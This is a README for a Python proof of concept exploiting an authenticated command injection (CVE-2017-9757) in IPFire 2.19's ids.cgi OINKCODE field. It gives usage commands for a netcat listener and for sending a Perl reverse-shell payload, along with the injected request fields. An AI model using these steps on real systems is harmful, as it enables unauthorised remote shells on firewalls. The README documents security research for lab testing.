# IPFire 2.19 OINKCODE RCE PoC

Python proof of concept for the authenticated command-injection vulnerability in IPFire 2.19's `ids.cgi` page through the `OINKCODE` parameter.

> **For authorized security testing and training labs only.** Run this PoC only against systems that you own or have explicit permission to test. The author is not responsible for misuse or damage caused by this code.

## Vulnerability overview

IPFire 2.19 is vulnerable to OS command injection in the `OINKCODE` parameter processed by `/cgi-bin/ids.cgi`. The parameter is incorporated into a shell command without proper neutralization, allowing an authenticated user to execute commands on the IPFire host.

The vulnerability is commonly identified as **CVE-2017-9757** and maps to **CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')**.

The original public PoC was tested against IPFire 2.19 Core Update 110. The Metasploit module considers versions up to IPFire 2.19 with Core Update 110 to be within its supported check range.

## Why this PoC was created

The original Python PoC from Exploit-DB performs a verification request using:

```python
OINKCODE = '`id`'
```

It then declares the target vulnerable only if the HTTP response contains:

```text
uid=99(nobody)
```

That validation is unreliable. The command may execute while its output is consumed by the shell command constructed by the CGI instead of being reflected in the HTML response returned to the client. As a result, the server can return a normal `HTTP 200` page without including the output of `id`, producing a false negative.

This implementation follows the validation logic used by the Metasploit module:

1. Request `/cgi-bin/pakfire.cgi` with HTTP Basic Authentication.
2. Extract the IPFire version and Core Update from the response.
3. Treat IPFire `<= 2.19` and Core Update `<= 110` as appearing vulnerable.
4. Send the command payload to `/cgi-bin/ids.cgi` in the `OINKCODE` field.
5. Treat a non-`200` response as a rejected request or authentication problem.
6. Do not inspect the HTML body for `uid=99(nobody)`.

The PoC also uses a Perl command-shell payload, matching the command payload family supported by the Metasploit module. A successful HTTP response does not, by itself, prove that the reverse shell connected; the listener and network path must also be verified.

## Differences between the source exploits

| Feature | Exploit-DB 42149 Python PoC | Exploit-DB 42369 / Metasploit | This PoC |
|---|---|---|---|
| Vulnerable endpoint | `/cgi-bin/ids.cgi` | `/cgi-bin/ids.cgi` | `/cgi-bin/ids.cgi` |
| Version check | None | `GET /cgi-bin/pakfire.cgi` | Same Metasploit-style check |
| Authentication | Basic Auth | Basic Auth header | Basic Auth through `requests.Session` |
| Initial validation | Executes `` `id` `` and searches the response body | Checks the version, then sends the payload | Checks the version and uses the HTTP result code |
| False-negative risk | High: depends on `uid=99(nobody)` being reflected | Avoids body-content validation | Avoids body-content validation |
| Reverse shell | Bash `/dev/tcp` | Metasploit Unix command payload | Perl `IO::Socket::INET` command shell |
| TLS handling | Certificate verification disabled in the PoC | SSL enabled by default | Verification is disabled only with `-k`/`--insecure` |
| Configuration | Values are edited in the source | Metasploit options | Command-line arguments |

The Metasploit module's important success criterion is that an unexpected response code indicates invalid credentials or a rejected request. It does not require the response body to contain the output of the injected command.

## Requirements

- Python 3
- `requests`
- Valid IPFire credentials with access to the web interface
- A Perl interpreter on the target, normally available as `perl`
- A listener reachable from the IPFire host

Install the Python dependency:

```bash
python3 -m pip install requests
```

## Usage

### 1. Check the target version only

```bash
python3 ipfire_oinkcode_rce.py \
  --target 192.0.2.10 \
  --web-port 444 \
  --username admin \
  --lhost 192.0.2.20 \
  --check-only \
  --insecure
```

The password is requested interactively when `--password` is not supplied. This is recommended because putting a password directly in a command can expose it through shell history or the process list.

### 2. Start a listener

Use a listener on the address and port supplied as `--lhost` and `--lport`:

```bash
rlwrap nc -lvnp 4444
```

If `rlwrap` is not installed, use:

```bash
nc -lvnp 4444
```

### 3. Send the Perl reverse-shell payload

```bash
python3 ipfire_oinkcode_rce.py \
  --target 192.0.2.10 \
  --web-port 444 \
  --username admin \
  --lhost 192.0.2.20 \
  --lport 4444 \
  --insecure
```

For the usual IPFire self-signed HTTPS certificate, `--insecure`/`-k` is required. Use it only when certificate verification is intentionally not possible in the lab.

### Complete URL instead of host and port

The target can also be supplied as a complete base URL:

```bash
python3 ipfire_oinkcode_rce.py \
  --target https://192.0.2.10:444 \
  --username admin \
  --lhost 192.0.2.20 \
  --lport 4444 \
  --insecure
```

### Skip version fingerprinting

Use this only when the IPFire version has already been confirmed independently:

```bash
python3 ipfire_oinkcode_rce.py \
  --target 192.0.2.10 \
  --web-port 444 \
  --username admin \
  --lhost 192.0.2.20 \
  --lport 4444 \
  --skip-version-check \
  --insecure
```

### Specify a different Perl path

If Perl is not in the target's default `PATH`, provide its absolute path:

```bash
--perl-path /usr/bin/perl
```

## Command-line options

| Option | Default | Description |
|---|---:|---|
| `-t`, `--target` | Required | Target host/IP or complete base URL |
| `--scheme` | `https` | Scheme used when the target is only a host/IP |
| `--web-port` | `444` | IPFire web interface port |
| `-u`, `--username` | `admin` | IPFire username |
| `-p`, `--password` | Prompt | Password; omit to enter it without echo |
| `--lhost` | Required | Listener address reachable from IPFire |
| `--lport` | `4444` | Listener port |
| `--perl-path` | `perl` | Perl executable on the target |
| `--timeout` | `10` | HTTP timeout in seconds |
| `-k`, `--insecure` | Disabled | Disable TLS certificate verification |
| `--skip-version-check` | Disabled | Skip the `pakfire.cgi` check |
| `--check-only` | Disabled | Perform only the version check |

## Interpreting the output

### `HTTP 200` from `ids.cgi`

This means the HTTP request was accepted by the CGI according to the same practical criterion used by the Metasploit module. A normal HTML response is expected and is not proof that the vulnerability check failed.

Check the listener for the shell. If no shell arrives, investigate the callback address, routing, firewall egress rules, Perl availability, and the selected port.

### `HTTP 401` or `HTTP 403`

The request was not authorized. Check the username, password, target URL, port, and whether the account can access the IPFire web interface.

### `HTTP 404`

The target URL or CGI path is probably incorrect, or the service is not the expected IPFire web interface.

### Version not recognized

The script could not find the expected version string in `pakfire.cgi`. Confirm the target manually before using `--skip-version-check`.

### Request timeout after payload delivery

The injected command may keep the CGI request open while attempting the callback. Treat this as an indication to check the listener, not as definitive proof of a shell.

## Technical request flow

The script uses HTTP Basic Authentication and sends the following form fields to `ids.cgi`:

```text
ENABLE_SNORT_GREEN=on
ENABLE_SNORT=on
RULES=registered
OINKCODE=`<Perl command payload>`
ACTION=Download new ruleset
ACTION2=snort
```

The command is enclosed in backticks because the vulnerable application passes the `OINKCODE` value into a shell command. The exact request behavior depends on the target version and its local configuration.

## Limitations

- This is a proof of concept, not a complete exploitation framework.
- The version check is based on the behavior of the referenced Metasploit module; it is not a guarantee that every target with a matching banner is exploitable.
- A `200` response confirms the request was accepted, not that the reverse shell reached the listener.
- The Perl payload requires a working Perl interpreter and network connectivity from IPFire to the listener.
- The script does not attempt authentication bypass or CSRF exploitation; valid credentials are expected.

## References

- [NVD: CVE-2017-9757](https://nvd.nist.gov/vuln/detail/CVE-2017-9757)
- [Exploit-DB 42149: IPFire 2.19 Remote Code Execution](https://www.exploit-db.com/exploits/42149)
- [Exploit-DB 42369: IPFire < 2.19 Update Core 110 Remote Code Execution](https://www.exploit-db.com/exploits/42369)
- [Metasploit module: `ipfire_oinkcode_exec.rb`](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/ipfire_oinkcode_exec.rb)
- [Metasploit Perl command payload](https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/reverse_perl.rb)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

## Attribution

This project is an educational Python implementation based on the public research and proof of concept by 0x09AL, and on the Metasploit module maintained by the Metasploit community. It is not affiliated with or endorsed by IPFire, Exploit-DB, or Rapid7.
